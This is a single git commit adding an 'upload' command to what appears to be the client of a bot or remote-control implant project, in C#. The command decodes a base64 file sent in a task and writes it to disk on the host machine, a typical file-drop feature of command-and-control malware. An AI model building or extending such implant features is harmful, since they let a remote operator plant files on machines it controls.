17cea138e4b9de7c541f3a7f7c44585927bb2176
un4kn0wl3z <admin@unknownclub.net>
2023-05-02 15:07:48 +0700

    feat: add upload command

---
+++ pattaya-project-client/Commands/Implements/UploadFile.cs
@@ -0,0 +1,31 @@
+﻿using pattaya_project_client.Commands.Interfaces;
+using pattaya_project_client.Models;
+using System;
+using System.IO;
+
+namespace pattaya_project_client.Commands.Implements
+{
+    public class UploadFile : BotCommand
+    {
+        public override string TaskName => "upload";
+
+        public override string RunTask(BotTask task)
+        {
+            string filename;
+            if(task.IncomingFilename is null || task.IncomingFilename == "")
+            {
+                filename = Path.GetRandomFileName();
+
+            }
+            else
+            {
+                filename = task.IncomingFilename;   
+            }
+
+            byte[] bytes = Convert.FromBase64String(task.IncomingFile);
+            File.WriteAllBytes(filename, bytes);
+
+            return $"Saved {filename} to {Directory.GetCurrentDirectory()}";
+        }
+    }
+}
